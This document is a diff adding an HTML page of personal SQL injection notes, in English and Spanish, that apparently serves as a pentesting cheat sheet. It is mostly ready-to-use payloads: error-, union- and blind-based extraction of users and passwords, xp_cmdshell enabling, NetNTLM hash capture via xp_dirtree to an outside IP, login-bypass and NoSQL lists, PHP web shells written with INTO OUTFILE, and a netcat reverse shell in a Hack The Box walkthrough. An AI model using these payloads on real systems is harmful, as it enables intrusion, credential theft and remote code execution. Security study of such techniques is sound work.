@@ -1,0 +1,518 @@
+<h1 id="intro">Intro</h1>
+<hr />
+
+<h2 id="classes">Classes</h2>
+<ul>
+  <li><strong>INBOUND</strong><br />
+    &gt;   data is extracted using the same channel that is used to inject the SQL code.</li>
+  <li><strong>OUT OF BAND</strong><br />
+    &gt;   data is retrieved using a different channel</li>
+  <li><strong>INFERENTIAL</strong><br />
+    &gt;  there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behaviour</li>
+</ul>
+
+<h2 id="types">Types</h2>
+<ul>
+  <li><strong>Error-based</strong> <br />
+    &gt; the webpage show us an error</li>
+  <li><strong>Union-based</strong> <br />
+    &gt; The SQL UNION is used to combine the results of two or more SELECT SQL statements into a single result.</li>
+  <li><strong>Blind-sql-injection</strong> <br />
+    &gt; check with time or different information showing</li>
+</ul>
+
+<h2 id="methodology">methodology</h2>
+<ol>
+  <li>Identify injection and Injection type (with strings  use ‘ with numbers  dont)</li>
+  <li>Attack Error based</li>
+  <li>Attack Union based</li>
+  <li>Attack Blind</li>
+</ol>
+
+<h1 id="1-error-based-sql">1 Error based SQL</h1>
+<hr />
+<h2 id="case-1-mssql">case 1 MSSQL</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[site]/page.asp?id=1 or 1=convert(int,(USER))--
+</code></pre></div></div>
+<ul>
+  <li>respuesta
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Syntax error converting the nvarchar value 'nombre_de_usuario' to a column of data type int
+</code></pre></div>    </div>
+    <p>Grab the database user with USER
+Grab the database name with DB_NAME
+Grab the servername with @@servername
+Grab the Windows/OS version with @@version</p>
+  </li>
+</ul>
+
+<h2 id="case-2-mssql">Case 2 MSSQL</h2>
+<p>https://www.exploit-db.com/papers/12975/</p>
+
+<ul>
+  <li>Enumerate column and table name
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.example.com/page.asp?id=1' HAVING 1=1--
+Error message: Column 'news.news_id' is invalid                 &lt; table_name.column
+</code></pre></div>    </div>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.example.com/page.asp?id=1' GROUP BY news.news_id HAVING 1=1--
+Error message: Column 'news.news_author' is invalid           &lt; table_name.column2
+</code></pre></div>    </div>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.example.com/page.asp?id=1' GROUP BY news.news_id,news.news_author HAVING 1=1--
+Error message: Column 'news.news_detail' is invalid             &lt; table_name.column3
+</code></pre></div>    </div>
+    <p>Until no error</p>
+  </li>
+  <li>Enumerate version, db name, users:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.example.com/page.asp?id=1+and+1=convert(int,@@version)--
+http://www.example.com/page.asp?id=1+and+1=convert(int,db_name())--
+http://www.example.com/page.asp?id=1+and+1=convert(int,user_name())--       &lt;&lt; Is the user running as dbo or sa?
+</code></pre></div>    </div>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xp_cmdshell &lt;&lt; if running as database admin
+http://www.example.com/news.asp?id=1; exec master.dbo.xp_cmdshell 'command'
+'; exec master.dbo.xp_cmdshell 'command'
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>On MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXEC sp_configure 'show advanced options', 1;--
+RECONFIGURE;--
+EXEC sp_configure 'xp_cmdshell', 1;--
+RECONFIGURE;--  
+</code></pre></div></div>
+<p>On MSSQL 2000:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXEC sp_addextendedproc 'xp_anyname', 'xp_log70.dll';--
+</code></pre></div></div>
+
+<h1 id="2--union-based-sqli">2  Union based SQLI</h1>
+<hr />
+
+<h2 id="case-1-mssql-1">case 1 MSSQL</h2>
+<p>ejemplo :192.168.30.35/comment.php?id=437</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=738 order by 1
+?id=738 order by 2
+?id=738 order by n
+hasta que aparece un error " unkown column 7 in order clause"
+</code></pre></div></div>
+
+<p>ej 2</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=738 union select 1,2,3,4,5,6
+</code></pre></div></div>
+<p>ej 3</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=-1 union select 1,2,3,4,@@version,6
+?id=-1 union select 1,2,3,4,user(),6
+</code></pre></div></div>
+<p>ej 4</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=-1 union select 1,2,3,4,table_name,6 FROM information_schema tables
+</code></pre></div></div>
+<p>then</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=-1 union all select 1,2,3,4,column_name,6 FROM information_schema columns where table_name='users'
+esto nos devuelve que hay 4 columnas, id name password y country
+</code></pre></div></div>
+<p>then</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id=-1 union select 1,2,name,4,password,6 FROM users
+</code></pre></div></div>
+<p>esto se sluciona deshabilitando error reporting (video 94)</p>
+
+<h2 id="case-2-mysql">case 2 MySQL</h2>
+<ul>
+  <li>enumerate columns
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[site]/page.php?id=1 order by 1/*
+http://[site]/page.php?id=1 order by 2/*
+http://[site]/page.php?id=1 order by 5/*
+5 gives a valid page
+</code></pre></div>    </div>
+  </li>
+  <li>union
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[site]/page.php?id=1 union all select 1,2,3,4,5/
+gives a valid page
+</code></pre></div>    </div>
+    <p>Change the first part of the query to a null or negative value so we can see</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[site]/page.php?id=-1 union all select 1,2,3,4,5/*
+prints only 2 and 3
+</code></pre></div>    </div>
+  </li>
+  <li>grab info
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[site]/page.php?id=null union all select 1,user(),3,4,5/*
+http://[site]/page.php?id=null union all select 1,2,database(),4,5/*
+http://[site]/page.php?id=null union all select 1,@@version,@@datadir,4,5/*
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h1 id="3-blind-sqli">3 Blind SQLi</h1>
+<hr />
+<h2 id="case-1-mssql-2">case 1 MSSQL</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[site]/page.asp?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+http://[site]/page.asp?id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+http://[site]/page.asp?id=1; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--
+...
+etc until we wait for 10 secs
+</code></pre></div></div>
+<ul>
+  <li>to extract the user name:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))&gt;97) WAITFOR DELAY '00:00:10'--
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))&gt;98) WAITFOR DELAY '00:00:10'--
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--
+hangs for 10 seconds
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))&gt;97) WAITFOR DELAY '00:00:10'--
+http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+hangs for 10 seconds
+</code></pre></div>    </div>
+    <p>and so on</p>
+  </li>
+</ul>
+
+<p>podemos probar</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id=738-sleep(5)  &lt;-si vemos que tarda es por que el input es injectable
+select IF(MID(@@version,1,1) = '5',SLEEP(5),0)
+</code></pre></div></div>
+
+<p>tmb podemos probar con un and para ver si trae o no resultados</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id=6 and 1=1
+id=6 and 1=2
+</code></pre></div></div>
+<p>SUPONEMOs que es injectable y buscamos un archivo con load_file</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id=738 union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
+</code></pre></div></div>
+<p>Creamos un php</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id=738 union all select 1,2,3,4,"&lt;?php echo shell_exec($_GET['cmd'];?&gt;",6 into OUTFILE'c:/xampp/htdocs/backdoor.php'
+</code></pre></div></div>
+
+<p>With blind SQL injection vulnerabilities, many techniques such as UNION attacks are not effective</p>
+
+<h2 id="exploiting-blind-sql-injection-by-triggering-conditional-responses">Exploiting blind SQL injection by triggering conditional responses</h2>
+
+<p>Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:</p>
+
+<p>Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</p>
+
+<p>When a request containing a TrackingId cookie is processed, the application determines whether this is a known user using an SQL query like this:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+</code></pre></div></div>
+<p>This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If it returns data (because a recognized TrackingId was submitted), then a “Welcome back” message is displayed within the page.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xyz' UNION SELECT 'a' WHERE 1=1-- &lt;&lt; shows welcome back
+xyz' UNION SELECT 'a' WHERE 1=2--  &lt;&lt; shows nothing
+</code></pre></div></div>
+<p>try to gues the password for Administrator:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) &gt; 'm'--
+xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) &gt; 't'--
+</code></pre></div></div>
+<p>We can continue this process to systematically determine the full password for the Administrator user.</p>
+
+<h2 id="inducing-conditional-responses-by-triggering-sql-errors">Inducing conditional responses by triggering SQL errors</h2>
+<p>To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xyz' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--
+xyz' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--
+</code></pre></div></div>
+<p>These inputs use the CASE keyword to test a condition and return a different expression depending on whether the expression is true. With the first input, the case expression evaluates to NULL, which does not cause any error. With the second input, it evaluates to 1/0, which causes a divide-by-zero error. Assuming the error causes some difference in the application’s HTTP response, we can use this difference to infer whether the injected condition is true.</p>
+
+<p>Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xyz' union select case when (username = 'Administrator' and SUBSTRING(password, 1, 1) &gt; 'm') then 1/0 else null end from users—
+</code></pre></div></div>
+<h2 id="exploiting-blind-sql-injection-by-triggering-time-delays">Exploiting blind SQL injection by triggering time delays</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+</code></pre></div></div>
+<ul>
+  <li>attack
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) &gt; 'm') = 1 WAITFOR DELAY '0:0:{delay}'—
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h1 id="mssql-capture-and-crack-netntlm-hash">mssql Capture and crack NetNTLM hash</h1>
+<hr />
+<p>the MSSQL Server service account can be made to initiate a remote
+SMB connection using the command below.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'+EXEC+master.sys.xp_dirtree+'\\10.10.14.9\share--
+</code></pre></div></div>
+
+<p>si corremos responder en 10.10.14.9 vamos a pegar hashes</p>
+
+<h1 id="sql-filter-bypass">SQL filter bypass</h1>
+<hr />
+<p>Beyond SQLi: Obfuscate and Bypass - https://www.exploit-db.com/papers/17934/</p>
+
+<p>AND, OR operators
+AND = &amp;&amp;
+OR = ||</p>
+
+<p>Comment operator « Mysql</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--  	
+#  
+/**/  
+</code></pre></div></div>
+
+<h3 id="retrieving-multiple-values-within-a-single-column-string-concatenation">Retrieving multiple values within a single column STRING CONCATENATION</h3>
+<p>In the preceding example, suppose instead that the query only returns a single column.</p>
+
+<p>You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' UNION SELECT username || '~' || password FROM users--
+</code></pre></div></div>
+<p>This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.</p>
+
+<h2 id="examining-the-database-in-sql-injection-attacks">Examining the database in SQL injection attacks</h2>
+
+<h3 id="oracle">ORACLE</h3>
+<p>On Oracle, you can obtain the same information with slightly different queries.</p>
+
+<p>You can list tables by querying all_tables:</p>
+
+<p>SELECT * FROM all_tables</p>
+
+<p>And you can list columns by querying all_tab_columns:</p>
+
+<p>SELECT * FROM all_tab_columns WHERE table_name = ‘USERS’</p>
+
+<h1 id="jarvis-case-blind-sqli">JARVIS CASE BLIND SQLI</h1>
+<hr />
+
+<h2 id="identifing">identifing</h2>
+<p>la detectamos con:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://jarvis.htb/room.php?cod=6 and 1=1
+http://jarvis.htb/room.php?cod=6 and 1=2
+</code></pre></div></div>
+<h2 id="enumeration">enumeration</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jarvis.htb/room.php?cod=6 order by 1
+jarvis.htb/room.php?cod=6 order by 7
+jarvis.htb/room.php?cod=6 order by 8 &gt; error
+</code></pre></div></div>
+<ul>
+  <li>chequeamos que tipos estan permitidos</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/room.php?cod=6 UNION SELECT 'a','a','a','a','a','a','a'
+/room.php?cod=6 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL
+jarvis.htb/room.php?cod=6 UNION SELECT 1,2,3,4,5,6,7
+</code></pre></div></div>
+<ul>
+  <li>show results
+usamos -1 para que nos muestre los numeros en otro lado
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jarvis.htb/room.php?cod=-1 UNION SELECT 1,2,3,4,5,6,7
+</code></pre></div>    </div>
+    <p>nos muestra 2,3,4,5</p>
+  </li>
+  <li>probamos ver la version en alguno de los campos imprimibles
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jarvis.htb/room.php?cod=-1 UNION SELECT 1,@@verion,3,4,5,6,7
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>seguimos enumerando</p>
+  </li>
+  <li>user, hostname , db</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://jarvis.htb/room.php?cod=-1%20UNION%20SELECT%20NULL,@@version,user(),@@hostname,5,6,7
+
+user = DBadmin@localhost
+hostname = jarvis
+database() = HOTEL
+</code></pre></div></div>
+
+<ul>
+  <li>schema</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jarvis.htb/room.php?cod=-1 UNION SELECT 1,(select SCHEMA_NAME from Information_Schema.SCHEMATA LIMIT3,1),3,4,5,6,7
+</code></pre></div></div>
+
+<ul>
+  <li>lfi</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://jarvis.htb/room.php?cod=-1%20UNION%20SELECT%20NULL,@@version,LOAD_FILE(%22/etc/passwd%22),4,5,NULL,NULL
+
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+messagebus:x:105:110::/var/run/dbus:/bin/false
+pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
+mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
+
+</code></pre></div></div>
+<ul>
+  <li>lfi 2</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/www/html/index.php
+
+<span class="cp">&lt;?php</span>
+          <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+          <span class="k">include</span><span class="p">(</span><span class="s2">"connection.php"</span><span class="p">);</span>
+          <span class="k">include</span><span class="p">(</span><span class="s2">"roomobj.php"</span><span class="p">);</span>
+          <span class="nv">$result</span><span class="o">=</span><span class="nv">$connection</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">"select * from room"</span><span class="p">);</span>
+          <span class="k">while</span><span class="p">(</span><span class="nv">$line</span><span class="o">=</span><span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
+            <span class="nv">$room</span><span class="o">=</span><span class="k">new</span> <span class="nx">Room</span><span class="p">();</span>
+            <span class="nv">$room</span><span class="o">-&gt;</span><span class="na">cod</span><span class="o">=</span><span class="nv">$line</span><span class="p">[</span><span class="s1">'cod'</span><span class="p">];</span>
+            <span class="nv">$room</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nv">$line</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
+            <span class="nv">$room</span><span class="o">-&gt;</span><span class="na">price</span><span class="o">=</span><span class="nv">$line</span><span class="p">[</span><span class="s1">'price'</span><span class="p">];</span>
+            <span class="nv">$room</span><span class="o">-&gt;</span><span class="na">star</span><span class="o">=</span><span class="nv">$line</span><span class="p">[</span><span class="s1">'star'</span><span class="p">];</span>
+            <span class="nv">$room</span><span class="o">-&gt;</span><span class="na">image</span><span class="o">=</span><span class="nv">$line</span><span class="p">[</span><span class="s1">'image'</span><span class="p">];</span>
+            <span class="nv">$room</span><span class="o">-&gt;</span><span class="na">mini</span><span class="o">=</span><span class="nv">$line</span><span class="p">[</span><span class="s1">'mini'</span><span class="p">];</span>
+
+            <span class="nv">$room</span><span class="o">-&gt;</span><span class="na">printRoom</span><span class="p">();</span>
+            <span class="p">}</span>
+          <span class="cp">?&gt;</span>
+</code></pre></div></div>
+<ul>
+  <li>LFI 3</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/www/html/connection.php
+
+$connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');
+
+</code></pre></div></div>
+<ul>
+  <li>Reverse shell</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>la creamos
+
+/room.php?cod=-1 UNION SELECT NULL,1,1,4,"&lt;?php system($_GET[\"cmd\"]); ?&gt;",NULL,NULL into OUTFILE"/var/www/html/shell3.php"
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>la iniciamos
+
+/shell3.php?cmd=nc -nv 10.10.14.6 4444 -e /bin/bash
+</code></pre></div></div>
+
+<h1 id="second-order-sqli">second order sqli</h1>
+<hr />
+
+<p>registramos cuentas con un sqli por ejemplo</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rop' or 2=2 #
+' or 0=0 ​ --
+' or 0=0 #
+' or 0=0 #"
+' or '1'='1'​ --
+' or 1 ​ --'
+' or 1=1​ --
+' or 1=1 or ''='
+' or 1=1 or ""=
+' or a=a​ --
+' or a=a
+') or ('a'='a
+'hi' or 'x'='x';
+</code></pre></div></div>
+
+<p>despues nos logueamos
+rop’ or 2=2 #:password</p>
+
+<h1 id="login-bypass">Login Bypass:</h1>
+<hr />
+<p>replace ‘ with “ if fail</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' or '1'='1  
+' or 1=1;--  
+' or 1=1;#  
+') or ('x'='x  
+' or &lt;column&gt; like '%';--  
+' or 1=1 LIMIT 1;--  
+
+USERNAME:   ' or 1/*  
+PASSWORD:   */ =1 --  
+
+USERNAME: admin' or 'a'='a  
+PASSWORD '#  
+
+USERNAME: admin' --  
+PASSWORD:
+</code></pre></div></div>
+
+<h1 id="inject-webshell">inject webshell</h1>
+<hr />
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mysql
+'*'   
+'&amp;'  
+'^'  
+'-'  
+' or true;--   
+' or 1;--  
+
+union all select "&lt;?php echo shell_exec($_GET['cmd']);?&gt;",2,3,4,5,6 into OUTFILE '/var/www/html/shell.php'
+</code></pre></div></div>
+
+<h1 id="nosql">NoSql</h1>
+<hr />
+
+<h2 id="like-sql">like sql</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select * from usernames where user='$user';
+
+$user-&gt;findone(array(
+"username"=&gt; "$user"
+));
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>usuarios que no son iguales ''
+user-&gt;findone(array(
+"username"=&gt; "{$ne:''}"
+));
+
+</code></pre></div></div>
+
+<h2 id="injection--php">injection  php</h2>
+<p>url check if user exist</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username[$ne]=RandomNoexiste&amp;password[$ne]=noexiste
+</code></pre></div></div>
+
+<h2 id="injection-with-regex--php">injection with regex  php</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>check for 1 char and 4 char usernames
+username[$regex]=^.{1}&amp;password=noexist
+username[$regex]=^.{4}&amp;password=noexist
+</code></pre></div></div>
+
+<h2 id="nodejs">node.js</h2>
+<ol>
+  <li>change Content-type application/json</li>
+  <li>convert payload to json</li>
+</ol>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+"username": { "$ne": "RandomNOExiste"},
+"passowrd": { "$ne": "ipssec"},
+"login":"login"
+}
+
+</code></pre></div></div>
+
+<h1 id="automated-sql-injection-tools-sqlmap">Automated sql injection tools [sqlmap]</h1>
+<hr />
+<p>buscar vulnerabilidades</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali: sqlmap -u http:192.168.30.35 --crawl=1
+</code></pre></div></div>
+<p>Sacando data</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:sqlmap -u http://192.168.30.35/comment.php?id=839 --dbms=mysql --dump --threads=5
+</code></pre></div></div>
+
+<p>otros argumentos:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--os-shell: automatic code execution: os-shel&gt; ipconfig -&gt;succes
+</code></pre></div></div>
+
+<h1 id="resources">RESOURCES</h1>
+<hr />
+<p>https://linuxhint.com/blind_sql_injection_tutorial/</p>
